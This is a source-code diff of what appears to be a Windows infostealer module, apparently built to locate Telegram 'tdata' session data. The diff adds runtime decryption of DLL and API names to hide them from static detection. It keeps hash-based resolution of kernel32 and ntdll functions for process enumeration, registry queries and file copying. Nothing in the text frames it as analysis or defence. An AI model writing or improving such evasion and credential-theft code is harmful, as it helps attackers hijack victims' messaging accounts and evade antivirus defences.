@@ -18,6 +18,7 @@
 #include "hashes.h"
 #include "nt_types.h"
 #include "file_utils.h"
+#include "enc_strings.h"
 
 #ifdef ENABLE_TELEGRAM
 #ifdef _WIN32
@@ -88,28 +89,36 @@ static void *resolve_fn(void *mod, const char *name) {
     return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
 }
 
+static void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t enc_len) {
+    char name[32];
+    enc_decrypt(enc, enc_len, name);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
+}
+
 static int ensure_api(void) {
     if (g_api.ready) return 1;
 
-    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
     if (!k32) return 0;
 
-    g_api.pGetEnvA  = (fnGetEnvA)              resolve_fn(k32, "GetEnvironmentVariableA");
-    g_api.pFF       = (fnFindFirstFileA)       resolve_fn(k32, "FindFirstFileA");
-    g_api.pFN       = (fnFindNextFileA)        resolve_fn(k32, "FindNextFileA");
-    g_api.pFC       = (fnFindClose)            resolve_fn(k32, "FindClose");
-    g_api.pGFA      = (fnGetFileAttributesA)   resolve_fn(k32, "GetFileAttributesA");
-    g_api.pMKDir    = (fnCreateDirectoryA)     resolve_fn(k32, "CreateDirectoryA");
-    g_api.pCopy     = (fnCopyFileA)            resolve_fn(k32, "CopyFileA");
+    g_api.pGetEnvA  = (fnGetEnvA)              resolve_fn_enc(k32, enc_GetEnvironmentVariableA, ENC_GETENVIRONMENTVARIABLEA_LEN);
+    g_api.pFF       = (fnFindFirstFileA)       resolve_fn_enc(k32, enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN);
+    g_api.pFN       = (fnFindNextFileA)        resolve_fn_enc(k32, enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN);
+    g_api.pFC       = (fnFindClose)            resolve_fn_enc(k32, enc_FindClose, ENC_FINDCLOSE_LEN);
+    g_api.pGFA      = (fnGetFileAttributesA)   resolve_fn_enc(k32, enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN);
+    g_api.pMKDir    = (fnCreateDirectoryA)     resolve_fn_enc(k32, enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN);
+    g_api.pCopy     = (fnCopyFileA)            resolve_fn_enc(k32, enc_CopyFileA, ENC_COPYFILEA_LEN);
 
-    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
+    char dll2[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll2);
+    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll2));
     if (!ntdll) return 0;
 
-    g_api.pGetNextProc = (fnNtGetNextProcess)resolve_fn(ntdll, "NtGetNextProcess");
-    g_api.pQIP         = (fnNtQueryInformationProcess)resolve_fn(ntdll, "NtQueryInformationProcess");
-    g_api.pNtClose     = (fnNtClose)resolve_fn(ntdll, "NtClose");
-    g_api.pOpenKey     = (fnNtOpenKey)resolve_fn(ntdll, "NtOpenKey");
-    g_api.pQueryVal    = (fnNtQueryValueKey)resolve_fn(ntdll, "NtQueryValueKey");
+    g_api.pGetNextProc = (fnNtGetNextProcess)resolve_fn_enc(ntdll, enc_NtGetNextProcess, ENC_NTGETNEXTPROCESS_LEN);
+    g_api.pQIP         = (fnNtQueryInformationProcess)resolve_fn_enc(ntdll, enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN);
+    g_api.pNtClose     = (fnNtClose)resolve_fn_enc(ntdll, enc_NtClose, ENC_NTCLOSE_LEN);
+    g_api.pOpenKey     = (fnNtOpenKey)resolve_fn_enc(ntdll, enc_NtOpenKey, ENC_NTOPENKEY_LEN);
+    g_api.pQueryVal    = (fnNtQueryValueKey)resolve_fn_enc(ntdll, enc_NtQueryValueKey, ENC_NTQUERYVALUEKEY_LEN);
 
     if (!g_api.pGetEnvA || !g_api.pFF || !g_api.pFN || !g_api.pFC ||
         !g_api.pGFA || !g_api.pMKDir || !g_api.pCopy || !g_api.pGetNextProc || !g_api.pQIP ||
@@ -400,7 +409,8 @@ static size_t discover_registry(char paths[][TDATA_PATH_LEN],
                                  size_t max_paths, size_t start) {
     size_t count = start;
 
-    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
+    char dll3[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll3);
+    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll3));
     if (!ntdll) return count;
 
     /* Open HKCR root */
